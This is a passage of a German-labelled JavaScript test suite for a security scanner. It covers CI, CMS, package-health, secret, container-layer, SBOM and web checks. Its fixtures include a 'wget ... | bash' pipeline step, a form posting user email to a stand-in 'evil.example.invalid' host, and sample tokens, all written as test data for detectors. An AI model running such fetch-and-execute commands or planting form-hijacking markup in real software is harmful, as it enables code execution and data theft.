    check('azure: Klartext-Variable, Vorlagen ohne ref, --privileged (vmImage kein Fund)', ids(azF) === 'ci-include-unpinned,ci-plaintext-secret,ci-privileged-container');
    const jf = "@Library('shared-lib') _\npipeline {\n  agent { docker { image 'maven:latest' } }\n  environment {\n    DB_PASSWORD = 'hunter2hunter2'\n    TOKEN = credentials('tok')\n  }\n  stages { stage('b') { steps { sh 'wget -qO- https://x.example/i.sh | bash' } } }\n}\n";
    const jfF = keep(sup.ciOther([{ label: 'Jenkinsfile', content: jf }]));
    check('jenkins: Bibliothek ohne Version, :latest, Klartext-Passwort, wget|bash', ids(jfF) === 'ci-curl-pipe-sh,ci-image-latest,ci-include-unpinned,ci-plaintext-secret');
    check('jenkins: credentials() und gepinnte Bibliothek still', sup.ciOther([{ label: 'Jenkinsfile', content: `@Library('shared-lib@${'c'.repeat(40)}') _\npipeline {\n  agent any\n  environment { TOKEN = credentials('tok') }\n}\n` }]).length === 0);
    const rn = keep(sup.ciOther([{ label: 'runner/config.toml', content: '[[runners]]\n  [runners.docker]\n    privileged = true\n' }]));
    check('gitlab-runner: privileged erkannt, false still', ids(rn) === 'ci-privileged-runner' && sup.ciOther([{ label: 'config.toml', content: '[runners.docker]\n  privileged = false\n' }]).length === 0);

    // cms (Projekt)
    const wp = keep(cmsM.cmsConfig([{ label: 'site/wp-config.php', content: "<?php\ndefine('DB_NAME', 'x');\ndefine('WP_DEBUG', true);\n" }]));
    check('cms: wp-config mit WP_DEBUG und ohne DISALLOW_FILE_EDIT', ids(wp) === 'wp-debug-on,wp-file-edit-allowed' && wp.find((f) => f.ruleId === 'wp-debug-on').location === 'site/wp-config.php:3');
    check('cms: gehärtete wp-config still', cmsM.cmsConfig([{ label: 'wp-config.php', content: "<?php\ndefine('WP_DEBUG', false);\ndefine('DISALLOW_FILE_EDIT', true);\n" }]).length === 0);
    const jo = keep(cmsM.cmsConfig([{ label: 'configuration.php', content: "<?php\nclass JConfig {\n  public $debug = '1';\n  public $error_reporting = 'maximum';\n}\n" }, { label: 'conf/LocalConfiguration.php', content: "<?php return ['SYS' => ['displayErrors' => 1, 'devIPmask' => '*']];" }]));
    check('cms: Joomla-Debug, Fehlerausgabe und TYPO3-displayErrors', ids(jo) === 'joomla-debug-on,joomla-error-reporting,typo3-debug-on');
    check('cms: Joomla ohne Debug still', cmsM.cmsConfig([{ label: 'configuration.php', content: "<?php\nclass JConfig {\n  public $debug = '0';\n}\n" }]).length === 0);
    const inv = cmsM.cmsInventory([
      { label: 'site/wp-includes/version.php', content: "<?php\n$wp_version = '6.1.1';\n" },
      { label: 'site/wp-content/plugins/contact-form-7/wp-contact-form-7.php', content: '<?php\n/*\nPlugin Name: Contact Form 7\nVersion: 5.7.1\n*/\n' },
      { label: 'site/wp-content/themes/twentytwenty/style.css', content: '/*\nTheme Name: Twenty Twenty\nVersion: 2.1\n*/\n' },
      { label: 'site/wp-content/plugins/x/readme.txt', content: 'Stable tag: trunk\n' },
    ]);
    check('cms: Bestand mit Kern, Plugin und Theme', inv.map((x) => `${x.kind}:${x.slug}@${x.version}`).join(',') === 'core:wordpress@6.1.1,plugin:contact-form-7@5.7.1,theme:twentytwenty@2.1');
    const hints = cmsM.cmsFromHtml([{ url: 'https://shop.example', html: '<meta name="generator" content="WordPress 6.1.1" /><link href="/wp-content/plugins/akismet/style.css?ver=5.0">' }]);
    check('cms: Webseite verrät Version (generator) und Plugins', hints.length === 2 && hints[0].version === '6.1.1' && hints[1].weak === true && cmsM.cmsFromHtml([{ url: 'x', html: '<p>Hallo</p>' }]).length === 0);
    keep(cmsM.webVersionFindings(hints, 'https://shop.example'));
    const nvdUrls = [];
    const nvdFetch = async (url) => { nvdUrls.push(url); return json(/wordpress%3Awordpress/.test(url) ? { totalResults: 1, vulnerabilities: [{ cve: { id: 'CVE-2023-1111', metrics: { cvssMetricV31: [{ cvssData: { baseScore: 8.1 } }] } } }] } : { totalResults: 0, vulnerabilities: [] }); };
    const nv = await cmsM.lookupCmsVulns([...inv, ...hints], { fetchImpl: nvdFetch, gapMs: 0 });
    keep(nv.findings);
    check('cms: NVD-Abgleich meldet verwundbaren Kern, Plugin ohne Treffer still', nv.findings.length === 2 && nv.findings.every((f) => f.ruleId === 'cms-vulnerable-core' && f.severity === 'high' && f.cvss === 8.1) && nv.ran && nvdUrls.every((u) => /versionStart=/.test(u) && /virtualMatchString=/.test(u)) && !nvdUrls.some((u) => /akismet/.test(u)));
    const nvBad = await cmsM.lookupCmsVulns(inv, { fetchImpl: async () => json({}, 500), gapMs: 0 });
    check('cms: NVD nicht erreichbar – keine Befunde, nicht vollständig', !nvBad.findings.length && !nvBad.ran && nvBad.notes.length === 3);

    // abandoned + scorecard (deps.dev)
    const { checkPackageHealth } = require('../src/core/pkghealth');
    const recent = new Date(Date.now() - 30 * 864e5).toISOString();
    const dd2 = {
      '/systems/npm/packages/oldpkg': { versions: [{ versionKey: { version: '1.0.0' }, publishedAt: '2019-01-01T00:00:00Z', isDefault: true }] },
      '/systems/npm/packages/oldpkg/versions/1.0.0': { relatedProjects: [{ projectKey: { id: 'github.com/a/old' }, relationType: 'SOURCE_REPO' }] },
      '/projects/github.com%2Fa%2Fold': { scorecard: { overallScore: 2.1, checks: [{ name: 'Maintained', score: 0, reason: 'project is archived' }, { name: 'Code-Review', score: 0 }] } },
      '/systems/npm/packages/goodpkg': { versions: [{ versionKey: { version: '2.0.0' }, publishedAt: recent, isDefault: true }] },
      '/systems/npm/packages/goodpkg/versions/2.0.0': { relatedProjects: [{ projectKey: { id: 'github.com/a/good' }, relationType: 'SOURCE_REPO' }] },
      '/projects/github.com%2Fa%2Fgood': { scorecard: { overallScore: 8.2, checks: [{ name: 'Maintained', score: 10, reason: '30 commit(s) and 5 issue activity found in the last 90 days' }] } },
    };
    const ph = await checkPackageHealth([{ ecosystem: 'npm', name: 'oldpkg', version: '1.0.0' }, { ecosystem: 'npm', name: 'goodpkg', version: '2.0.0' }], { fetchImpl: async (url) => { const k = url.replace('https://api.deps.dev/v3', ''); return dd2[k] ? json(dd2[k]) : json({}, 404); } });
    keep(ph.findings);
    check('pakete: verwaist, archiviert und niedrige Scorecard erkannt', ids(ph.findings) === 'pkg-abandoned,pkg-low-scorecard,pkg-repo-archived' && ph.findings.every((f) => f.package.name === 'oldpkg') && ph.findings.find((f) => f.ruleId === 'pkg-low-scorecard').severity === 'low' && ph.ran);
    const phOff = await checkPackageHealth([{ ecosystem: 'npm', name: 'oldpkg', version: '1.0.0' }], { fetchImpl: async () => { throw new Error('offline'); } });
    check('pakete: offline – keine Befunde, Lauf unvollständig', !phOff.findings.length && !phOff.ran && /offline/.test(phOff.notes.join(' ')));

    // malpkg (OSV MAL-)
    const { lookupCves } = require('../src/core/cve');
    const realFetch = global.fetch;
    global.fetch = async (url) => /querybatch/.test(url) ? json({ results: [{ vulns: [{ id: 'MAL-2024-1234' }] }, { vulns: [{ id: 'GHSA-aaaa-bbbb-cccc' }] }] })
      : /MAL-2024-1234/.test(url) ? json({ id: 'MAL-2024-1234', summary: 'Malicious code in evil-pkg (npm)' })
        : json({ id: 'GHSA-aaaa-bbbb-cccc', summary: 'XSS', aliases: ['CVE-2024-0001'], database_specific: { severity: 'MODERATE' }, affected: [] });
    let mal;
    try { mal = await lookupCves([{ ecosystem: 'npm', name: 'evil-pkg', version: '1.0.0' }, { ecosystem: 'npm', name: 'lib', version: '2.0.0' }]); } finally { global.fetch = realFetch; }
    keep(mal.findings.filter((f) => f.ruleId === 'malicious-package'));
    const malF = mal.findings.find((f) => f.ruleId === 'malicious-package');
    check('schadpaket: OSV-MAL-Eintrag wird kritisch gemeldet', !!malF && malF.severity === 'critical' && malF.package.name === 'evil-pkg' && /MAL-2024-1234/.test(malF.description));
    check('schadpaket: normale Lücke bleibt eine normale Lücke', mal.findings.some((f) => f.package && f.package.name === 'lib' && f.ruleId !== 'malicious-package' && f.severity === 'medium'));

    // secret-live
    const { verifyLiveSecrets, signSts } = require('../src/core/secretlive');
    const ghTok = 'ghp_' + 'A1b2C3d4'.repeat(5);
    const slTok = 'xoxb-908172635401-Zq8Rt4Lm2Np7';
    const sUnits = [{ label: 'cfg.js', content: `const gh = "${ghTok}";\nconst sl = "${slTok}";\nconst fake = "ghp_EXAMPLE${'x'.repeat(32)}";\n` }];
    const sFind = prescan(sUnits, {}).findings.filter((f) => f.category === 'Secrets');
    const calls = [];
    const liveFetch = async (url, init) => { calls.push(`${(init && init.method) || 'GET'} ${url}`); return /api\.github\.com\/user$/.test(url) ? json({ login: 'x' }) : /slack\.com\/api\/auth\.test$/.test(url) ? json({ ok: false, error: 'invalid_auth' }) : json({}, 404); };
    const sl = await verifyLiveSecrets(sFind, sUnits, { fetchImpl: liveFetch });
    const ghF = sl.findings.find((f) => f.liveCheck && f.liveCheck.provider === 'GitHub');
    const slF = sl.findings.find((f) => f.liveCheck && f.liveCheck.provider === 'Slack');
    keep([ghF, slF].filter(Boolean));
    check('live: gültiger GitHub-Token wird kritisch, gesperrter Slack-Token niedrig', ghF && ghF.severity === 'critical' && ghF.liveCheck.verdict === 'active' && slF && slF.severity === 'low' && slF.liveCheck.verdict === 'inactive');
    check('live: nur je eine lesende Identitätsabfrage, Beispielwerte nicht angefragt', calls.length === 2 && calls.includes('GET https://api.github.com/user') && calls.includes('POST https://slack.com/api/auth.test'));
    check('live: Schlüssel selbst wird nicht gespeichert', !JSON.stringify(sl.findings.map((f) => f.liveCheck)).includes(ghTok) && !JSON.stringify(sl.findings).includes(ghTok));
    const { runSupplyExtras } = require('../src/core/supplychain');
    let offCalls = 0;
    await runSupplyExtras({ targets: [], units: sUnits, prescanFindings: sFind, config: { cveLookup: false }, fetchImpl: async () => { offCalls++; return json({}); } });
    check('live: Standard aus – keine Anfrage', offCalls === 0);
    const sts = signSts('AKIDEXAMPLE', 'wJalrXUtnFEMI/K7MDENG+bPxRfiCYEXAMPLEKEY', new Date('2015-08-30T12:36:00Z'));
    check('live: AWS-STS-Signatur (SigV4) korrekt aufgebaut', /^AWS4-HMAC-SHA256 Credential=AKIDEXAMPLE\/20150830\/us-east-1\/sts\/aws4_request, SignedHeaders=content-type;host;x-amz-date, Signature=[0-9a-f]{64}$/.test(sts.headers.Authorization) && sts.body === 'Action=GetCallerIdentity&Version=2011-06-15');

    // layers (docker save)
    const tarFile = (entries) => {
      const bufs = [];
      for (const [name, data, type = '0'] of entries) {
        const body = Buffer.isBuffer(data) ? data : Buffer.from(data);
        const h = Buffer.alloc(512);
        h.write(name, 0, 100); h.write('0000644\0', 100); h.write('0000000\0', 108); h.write('0000000\0', 116);
        h.write(body.length.toString(8).padStart(11, '0') + '\0', 124); h.write('00000000000\0', 136); h.fill(' ', 148, 156); h.write(type, 156); h.write('ustar\0', 257); h.write('00', 263);
        let sum = 0; for (const b of h) sum += b; h.write(sum.toString(8).padStart(6, '0') + '\0 ', 148);
        bufs.push(h, body, Buffer.alloc((512 - (body.length % 512)) % 512));
      }
      bufs.push(Buffer.alloc(1024));
      return Buffer.concat(bufs);
    };
    const layTok = 'ghp_' + 'Z9y8X7w6'.repeat(5);
    const l1 = tarFile([['app/.env', 'SECRET=1'], ['app/setup.sh', `export GITHUB_TOKEN=${layTok}\n`], ['app/index.js', 'console.log(1)']]);
    const l2 = tarFile([['app/.wh..env', ''], ['app/.wh.setup.sh', '']]);
    const imageTar = (layer1, layer2) => tarFile([['manifest.json', JSON.stringify([{ Config: 'c.json', RepoTags: ['demo:1'], Layers: ['l1/layer.tar', 'l2/layer.tar'] }])], ['l1/layer.tar', layer1], ['l2/layer.tar', layer2]]);
    const { analyzeImageLayers } = require('../src/core/layers');
    const la = await analyzeImageLayers('demo:1', { save: async (img, out) => { fs.writeFileSync(out, imageTar(l1, l2)); return { ok: true }; } });
    keep(la.findings);
    const setupF = la.findings.find((f) => /setup\.sh/.test(f.title));
    check('schichten: gelöschte .env und Skript mit Token gefunden', la.ran && la.findings.length === 2 && setupF.severity === 'critical' && la.findings.find((f) => /\.env/.test(f.title)).severity === 'high' && !JSON.stringify(la.findings).includes(layTok) && setupF.location === 'demo:1 [layer 1]');
    const laGz = await analyzeImageLayers('demo:1', { save: async (img, out) => { fs.writeFileSync(out, imageTar(zlib.gzipSync(l1), l2)); return { ok: true }; } });
    check('schichten: komprimierte Schicht wird gelesen', laGz.findings.length === 2);
    const laClean = await analyzeImageLayers('demo:1', { save: async (img, out) => { fs.writeFileSync(out, imageTar(l1, tarFile([['app/new.txt', 'x']]))); return { ok: true }; } });
    check('schichten: nichts gelöscht – kein Fund', laClean.ran && laClean.findings.length === 0);
    const laMiss = await analyzeImageLayers('demo:1', { save: async () => ({ ok: false, missing: true }) });
    check('schichten: ohne docker kein Fund und nicht als gelaufen gewertet', !laMiss.ran && !laMiss.findings.length && /docker/.test(laMiss.notes[0]));

    // helm / kustomize
    const hdir = fs.mkdtempSync(path.join(os.tmpdir(), 'vigil-helm-'));
    fs.mkdirSync(path.join(hdir, 'chart', 'templates'), { recursive: true }); fs.mkdirSync(path.join(hdir, 'kust'));
    fs.writeFileSync(path.join(hdir, 'chart', 'Chart.yaml'), 'apiVersion: v2\nname: demo\nversion: 0.1.0\n');
    fs.writeFileSync(path.join(hdir, 'kust', 'kustomization.yaml'), 'resources:\n  - pod.yaml\n');
    const hUnits = [{ label: 'proj/chart/Chart.yaml', path: path.join(hdir, 'chart', 'Chart.yaml'), content: '' }, { label: 'proj/kust/kustomization.yaml', path: path.join(hdir, 'kust', 'kustomization.yaml'), content: '' }];
    const helmOut = '---\n# Source: demo/templates/deploy.yaml\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\nspec:\n  template:\n    spec:\n      containers:\n        - name: web\n          image: nginx:latest\n          securityContext:\n            privileged: true\n';
    const kustOut = 'apiVersion: v1\nkind: Pod\nmetadata:\n  name: p\nspec:\n  hostNetwork: true\n  securityContext:\n    runAsNonRoot: true\n  containers:\n  - name: c\n    image: busybox:1.36\n    resources:\n      limits:\n        cpu: 1\n';
    const runs = [];
    const fakeRun = async (cmd, args) => { runs.push([cmd, ...args].join(' ')); return cmd === 'helm' ? { ok: true, code: 0, stdout: helmOut } : cmd === 'kubectl' ? { ok: true, code: 0, stdout: kustOut } : { ok: false, error: 'ENOENT' }; };
    const hx = await runSupplyExtras({ targets: [{ type: 'path', value: hdir }], units: hUnits, config: { cveLookup: false }, run: fakeRun });
    const priv = hx.findings.find((f) => f.ruleId === 'k8s-privileged');
    check('helm: gerendertes Chart mit Kubernetes-Regeln geprüft', priv && priv.source === 'helm-render' && /chart\/templates\/deploy\.yaml \[helm template\]:\d+$/.test(priv.location) && runs.some((r) => /^helm template vigil-audit /.test(r)));
    check('kustomize: Rückfall auf kubectl kustomize', hx.findings.some((f) => f.ruleId === 'k8s-hostnetwork' && f.source === 'kustomize-render') && hx.ran.some((r) => r.source === 'helm-render') && hx.ran.some((r) => r.source === 'kustomize-render'));
    const hMiss = await runSupplyExtras({ targets: [{ type: 'path', value: hdir }], units: hUnits, config: { cveLookup: false }, run: async () => ({ ok: false, error: 'ENOENT' }) });
    check('helm/kustomize: fehlende Werkzeuge still übersprungen', !hMiss.findings.length && !hMiss.notes.length && !hMiss.ran.length);
    fs.rmSync(hdir, { recursive: true, force: true });

    // sbom
    const sbom = require('../src/core/sbom');
    const res = { meta: { sbom: [{ ecosystem: 'npm', name: '@babel/core', version: '7.22.0' }, { ecosystem: 'PyPI', name: 'Django', version: '4.2.1' }, { ecosystem: 'Maven', name: 'org.apache.logging.log4j:log4j-core', version: '2.14.1' }, { ecosystem: 'Go', name: 'github.com/gin-gonic/gin', version: '1.9.0' }, { ecosystem: 'npm', name: '@babel/core', version: '7.22.0' }] },
      findings: [{ ruleId: 'CVE-2021-44228', title: 'Verwundbare Abhaengigkeit: log4j-core 2.14.1 (CVE-2021-44228)', severity: 'critical', cvss: 10, package: { ecosystem: 'Maven', name: 'org.apache.logging.log4j:log4j-core', version: '2.14.1', fixed: '2.17.1' } }] };
    const cdx = JSON.parse(sbom.sbomJson(res, 'cyclonedx', { name: 'C:\\x\\shop' }));
    const purls = cdx.components.map((c) => c.purl).sort();
    check('sbom: CycloneDX 1.5 mit Paket-URLs', cdx.bomFormat === 'CycloneDX' && cdx.specVersion === '1.5' && /^urn:uuid:[0-9a-f-]{36}$/.test(cdx.serialNumber) && cdx.metadata.component.name === 'shop' && purls.join(' ') === 'pkg:golang/github.com/gin-gonic/gin@v1.9.0 pkg:maven/org.apache.logging.log4j/log4j-core@2.14.1 pkg:npm/%40babel/core@7.22.0 pkg:pypi/django@4.2.1');
    check('sbom: CycloneDX mit bekannter Lücke am betroffenen Paket', cdx.vulnerabilities.length === 1 && cdx.vulnerabilities[0].id === 'CVE-2021-44228' && cdx.vulnerabilities[0].affects[0].ref === 'pkg:maven/org.apache.logging.log4j/log4j-core@2.14.1' && cdx.dependencies[0].dependsOn.length === 4);
    const spdx = JSON.parse(sbom.sbomJson(res, 'spdx', { name: 'shop' }));
    check('sbom: SPDX 2.3 mit Paketen und Beziehungen', spdx.spdxVersion === 'SPDX-2.3' && spdx.dataLicense === 'CC0-1.0' && spdx.packages.length === 5 && spdx.packages.every((p) => /^SPDXRef-[A-Za-z0-9.-]+$/.test(p.SPDXID)) && spdx.relationships.filter((r) => r.relationshipType === 'DEPENDS_ON').length === 4 && /^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\dZ$/.test(spdx.creationInfo.created) && spdx.packages[1].externalRefs[0].referenceType === 'purl');
    check('sbom: leeres Ergebnis ergibt leere Liste', sbom.packagesOf({ meta: {} }).length === 0 && sbom.toCycloneDx({}).components.length === 0 && !('vulnerabilities' in sbom.toCycloneDx({})));

    // Englische Texte für alle neuen Befunde
    const GER2 = /[äöüß]|\b(der|die|das|und|nicht|ist|mit|für|oder|wird|werden|auf|eine?|zu|von|bei|nach|aus|sich)\b/;
    const left2 = all.map(i18n.localizeFinding).flatMap((f) => [f.title, f.description, f.impact, f.remediation]).filter((t) => t && GER2.test(t));
    check('englisch: neue Lieferketten-Befunde übersetzt', left2.length === 0);
    if (left2.length) console.log(left2.slice(0, 60).map((t) => '      ' + t).join('\n'));
  }

  // --- Web-Zusatzpruefungen (security.txt, SEO, Impressum, Observatory, TLS/DNS/Mail, Shodan, Tippfehler,
  //     JS-Bundles, SRI/CSP, Datenschutz, Barrierefreiheit, Ladezeit, Links, API, Aenderungs-Waechter) ---
  {
    const http = require('http');
    const crypto = require('crypto');
    const i18n = require('../src/core/findings-i18n');
    const netc = require('../src/core/modules/webnet');
    const pg = require('../src/core/modules/webpage');
    const { runWebSuite } = require('../src/core/modules/websuite');
    const { runDeepWeb } = require('../src/core/modules/webdeep');
    const all = [];
    const notesAll = [];
    const ids = (fs) => fs.map((f) => f.ruleId);
    const nx = () => Object.assign(new Error('nx'), { code: 'ENOTFOUND' });
    // Fremder "CDN"-Server (andere Herkunft) mit versioniertem Skript
    const cdn = http.createServer((req, res) => { res.writeHead(200, { 'Content-Type': 'application/javascript' }); res.end('/*! lib 1.2.3 */ window.lib = 1;'); });
    await new Promise((r) => cdn.listen(0, '127.0.0.1', r));
    const cdnBase = `http://127.0.0.1:${cdn.address().port}`;
    const site = http.createServer((req, res) => {
      const u = new URL(req.url, 'http://x');
      const send = (code, type, body, h = {}) => { res.writeHead(code, { 'Content-Type': type, ...h }); res.end(req.method === 'HEAD' ? '' : body); };
      if (u.pathname === '/') return send(200, 'text/html', `<html lang="de"><head><title>Testseite</title><script src="/app.js"></script><script src="${cdnBase}/lib-1.2.3.min.js"></script><script>var x=1;</script></head><body style="color:red"><img src="/logo.png"><form method="post" action="http://evil.example.invalid/collect"><input name="email"></form><a href="/impressum">Impressum</a> <a href="/datenschutz">Datenschutz</a> <a href="/kaputt">Alt</a> <a href="/ok">OK</a></body></html>`, { 'Set-Cookie': 'sid=1; Path=/', 'X-Content-Type-Options': 'nosniff' });
      if (u.pathname === '/app.js') return send(200, 'application/javascript', 'const k="AKIAIOSFODNN7EXAMPLF";fetch("http://10.0.0.5:8080/api/intern");const pk="pk_live_abcdefghijk12345";');
      if (u.pathname === '/impressum' || u.pathname === '/ok' || u.pathname === '/logo.png') return send(200, 'text/html', '<html><body>ok</body></html>');
      if (u.pathname === '/.well-known/security.txt') return send(200, 'text/plain', 'Contact: mailto:security@example.org\nExpires: 2020-01-01T00:00:00Z\n');
      if (u.pathname === '/robots.txt') return send(200, 'text/plain', 'User-agent: *\nDisallow: /\n');
      if (u.pathname === '/openapi.json') return send(200, 'application/json', JSON.stringify({ openapi: '3.0.0', security: [{ bearer: [] }], paths: { '/api/users': { get: {} }, '/api/health': { get: { security: [] } }, '/api/users/{id}': { get: {} }, '/api/logout': { get: {} } } }));
      if (u.pathname === '/api/users') return send(200, 'application/json', '[{"id":1,"email":"a@b.c"}]');
      if (u.pathname === '/api/health') return send(200, 'application/json', '{"ok":true}');
      if (u.pathname === '/api/logout') { calledLogout = true; return send(200, 'application/json', '{"bye":1}'); }
      send(404, 'text/html', '<html><body>nein</body></html>');
    });
    let calledLogout = false;
    await new Promise((r) => site.listen(0, '127.0.0.1', r));
    const base = `http://127.0.0.1:${site.address().port}/`;
    const dw = await runDeepWeb(base, { deep: true, rps: 200 });
    const previous = { at: '2026-11-01T10:00:00Z', origin: base.slice(0, -1), scripts: [{ url: base + 'app.js' }], forms: [{ page: base, action: base + 'login' }] };
    const s = await runWebSuite(base, { deep: true, pages: dw.pages, scripts: dw.scripts, previous, rps: 200 });
    all.push(...s.findings); notesAll.push(...s.notes);
    const got = ids(s.findings);
    check('websuite: security.txt abgelaufen, robots sperrt alles, keine Beschreibung', ['sectxt-expired', 'seo-robots-disallow-all', 'seo-description-missing'].every((x) => got.includes(x)), got.join(','));
    check('websuite: Impressum da, Datenschutz-Link defekt', got.includes('legal-privacy-broken') && !got.includes('legal-imprint-missing'));
    check('websuite: Header-Note als Info mit Abzügen', s.findings.some((f) => f.ruleId === 'observatory-grade' && f.severity === 'info' && /Note [A-F]/.test(f.title) && f.steps.some((x) => /HSTS|Content-Security-Policy/.test(x))));
    check('websuite: Zugangsdaten und interne Adresse im JS-Bundle, öffentlicher Stripe-Key ignoriert', got.includes('jsbundle-secret-aws-access-key-id') && got.includes('jsbundle-internal-urls') && !got.some((x) => /stripe-publishable/.test(x)) && !JSON.stringify(s.findings).includes('AKIAIOSFODNN7EXAMPLF'));
    check('websuite: Barrierefreiheit (Alternativtext, Feldbeschriftung)', got.includes('a11y-img-alt-missing') && got.includes('a11y-form-label-missing') && !got.includes('a11y-lang-missing'));
    check('websuite: defekter Link gefunden', s.findings.some((f) => f.ruleId === 'web-broken-links' && /kaputt/.test(f.description)));
    check('websuite: API ohne Anmeldung, Pfade mit Platzhalter/Logout nicht aufgerufen', got.includes('api-live-unauth-data') && got.includes('api-live-public-data') && !calledLogout);
    const csp = s.findings.find((f) => f.ruleId === 'csp-suggestion');
    check('websuite: CSP-Vorschlag mit fremder Quelle und form-action', csp && csp.patch.includes(`script-src 'self' ${cdnBase}`) && /form-action 'self' http:\/\/evil\.example\.invalid/.test(csp.patch) && /object-src 'none'/.test(csp.patch));
    check('websuite: Änderungs-Wächter – neues Fremdskript und umgebogenes Formular', got.includes('watch-new-third-party-script') && s.findings.some((f) => f.ruleId === 'watch-form-target-changed' && f.severity === 'high') && s.watch.scripts.some((x) => x.url.endsWith('lib-1.2.3.min.js') && x.sha256));
    check('websuite: Prüfungen als gelaufen gemeldet', ['web-sectxt', 'web-seo', 'web-legal', 'web-observatory', 'js-secrets', 'web-a11y', 'web-links', 'api-live', 'web-privacy'].every((x) => s.ran.includes(x)), s.ran.join(','));
    const again = await runWebSuite(base, { deep: false, pages: dw.pages, scripts: dw.scripts, previous: s.watch, rps: 200 });
    check('websuite: ohne Nachweis keine API-Abrufe; zweiter Lauf ohne Änderungen', !again.ran.includes('api-live') && !ids(again.findings).some((x) => /^watch-/.test(x)));
    const down = await runWebSuite('http://127.0.0.1:9/', { rps: 200 });
    check('websuite: nicht erreichbar – nichts als gelaufen gemeldet', !down.ran.length && /nicht erreichbar/.test(down.notes.join(' ')));
    site.close(); cdn.close();

    // DNS/Mail mit Stub-Resolver
    const txtMap = { '_mta-sts.example.com': [['v=STSv1; id=1']], '_dmarc.example.com': [['v=DMARC1; p=reject']] };
    const dnsStub = { resolveMx: async (n) => (n === 'example.com' ? [{ exchange: 'mx1.example.com', priority: 10 }] : []), resolveTxt: async (n) => { if (txtMap[n]) return txtMap[n]; throw nx(); } };
    const m1 = await netc.mailExtended('example.com', { dns: dnsStub }, { httpGet: async () => ({ ok: true, status: 200, body: 'version: STSv1\nmode: testing\nmx: mx2.example.com\nmax_age: 86400' }), allowFetch: () => true });
    all.push(...m1.findings);
    check('mail: MTA-STS Testmodus, MX passt nicht, TLS-RPT und BIMI fehlen', ['mail-mtasts-testing', 'mail-mtasts-mx-mismatch', 'mail-tlsrpt-missing', 'mail-bimi-missing'].every((x) => ids(m1.findings).includes(x)) && m1.ran);
    const m2 = await netc.mailExtended('example.com', { dns: dnsStub }, { httpGet: async () => { throw new Error('darf nicht'); }, allowFetch: () => false });
    check('mail: Richtlinie eines nicht freigegebenen Hosts wird nicht geladen', /nicht freigegeben/.test(m2.notes.join(' ')));
    const m3 = await netc.mailExtended('nomail.example', { dns: { resolveMx: async () => { throw nx(); }, resolveTxt: async () => { throw nx(); } } });
    const m4 = await netc.mailExtended('x.example', { dns: { resolveMx: async () => { throw Object.assign(new Error('t'), { code: 'ETIMEOUT' }); } } });
    check('mail: ohne MX übersprungen, DNS-Fehler gilt nicht als gelaufen', m3.ran && !m3.findings.length && !m4.ran);
    const jsonRes = (j, status = 200) => ({ ok: status < 400, status, json: async () => j });
    const sec = await netc.dnssec('example.com', { fetch: async (u) => { check('dnssec: nur über dns.google', u.startsWith('https://dns.google/resolve?name=example.com')); return jsonRes({ Status: 0, Answer: [] }); } });
    all.push(...sec.findings);
    check('dnssec: fehlender DS-Eintrag gemeldet', ids(sec.findings).includes('dns-dnssec-missing'));
    const day = 86400000;
    const rdap = (d) => netc.domainExpiry('example.com', { fetch: async () => jsonRes({ events: [{ eventAction: 'expiration', eventDate: new Date(Date.now() + d * day + 3600000).toISOString() }] }) });
    const [e10, e2, e90] = [await rdap(10), await rdap(2), await rdap(90)];
    all.push(...e10.findings);
    check('domain: Ablauf in 10 Tagen hoch, 2 Tagen kritisch, 90 Tage still', e10.findings[0].severity === 'high' && e2.findings[0].severity === 'critical' && !e90.findings.length && /läuft in 10 Tagen ab/.test(e10.findings[0].title));
    let blocked = false; try { await netc.extFetch({ fetch: async () => ({}) }, 'https://evil.example/'); } catch { blocked = true; }
    check('ausgehend: nur erlaubte Auskunftsdienste', blocked && netc.OUTBOUND_HOSTS.includes('internetdb.shodan.io'));
    const idb = await netc.internetDb('shop.example.com', { dns: { resolve4: async () => ['93.184.216.34', '10.0.0.1'] }, fetch: async (u) => { check('internetdb: keine internen IPs abgefragt', !u.includes('10.0.0.1')); return jsonRes({ ports: [443, 80, 3306], vulns: ['CVE-2021-1234'] }); } });
    all.push(...idb.findings);
    check('internetdb: Ports, riskanter Port, bekannte CVEs', ['internetdb-ports', 'internetdb-risky-port-3306', 'internetdb-known-vulns'].every((x) => ids(idb.findings).includes(x)) && idb.ran);
    const v = netc.typoVariants('beispiel.de');
    check('tippfehler: Varianten ohne Original', v.length === 60 && !v.includes('beispiel.de') && v.includes('beispiel.com') && v.includes('beispil.de'));
    // beispiel.com: gleiche NS; beispiel.net: Strato, leitet aber auf die eigene Seite weiter (Schutz-Registrierung);
    // beispiel.org: Mail ueber den eigenen Mail-Betreiber; beispil.de: fremd mit Mail
    const nsMap = { 'beispiel.de': ['ns1.mine.net'], 'beispiel.com': ['ns1.mine.net'], 'beispiel.net': ['docks09.rzone.de'], 'beispiel.org': ['ns.other.net'], 'beispil.de': ['ns.other.net'] };
    const mxMap = { 'beispiel.de': [{ exchange: 'mx1.mail.mine-mail.de' }], 'beispiel.net': [{ exchange: 'smtpin.rzone.de' }], 'beispiel.org': [{ exchange: 'mx2.mail.mine-mail.de' }], 'beispil.de': [{ exchange: 'mx.other.net' }] };
    const probedHosts = [];
    const typoCtx = { dns: { resolveNs: async (n) => { if (nsMap[n]) return nsMap[n]; throw nx(); }, resolveMx: async (n) => mxMap[n] || [], resolve4: async (n) => (n === 'beispiel.de' ? ['1.1.1.1'] : ['9.9.9.9']) },
      fetch: async (url) => { const h = new URL(url).hostname; probedHosts.push(h); return { status: h === 'beispiel.net' ? 301 : 200, headers: new Headers(h === 'beispiel.net' ? { location: 'https://www.beispiel.de/' } : {}) }; } };
    const typo = await netc.typoDomains('beispiel.de', typoCtx);
    all.push(...typo.findings); notesAll.push(...typo.notes);
    check('tippfehler: fremde Variante mit Mail gemeldet, eigene (NS, Weiterleitung, Mail-Betreiber) erkannt', typo.findings.some((f) => f.ruleId === 'typo-domains-registered' && /beispil\.de/.test(f.evidence) && !/beispiel\.(com|net|org)/.test(f.evidence)) && typo.findings.filter((f) => f.ruleId === 'typo-domain-mail').length === 1 && /beispiel\.net \(leitet auf www\.beispiel\.de weiter\)/.test(typo.notes.join(' ')) && /beispiel\.org/.test(typo.notes.join(' ')));
    check('tippfehler: nur unklare Varianten aufgerufen, ohne Abruf nur DNS', !probedHosts.includes('beispiel.com') && probedHosts.includes('beispil.de') && (await netc.typoDomains('beispiel.de', { ...typoCtx, fetch: async () => { throw new Error('kein Netz erwartet'); } }, { probeRedirects: false })).findings.some((f) => /nur im DNS/.test(f.description)));
    let crtCalled = false;
    const soon = new Date(Date.now() + 5 * day).toUTCString();
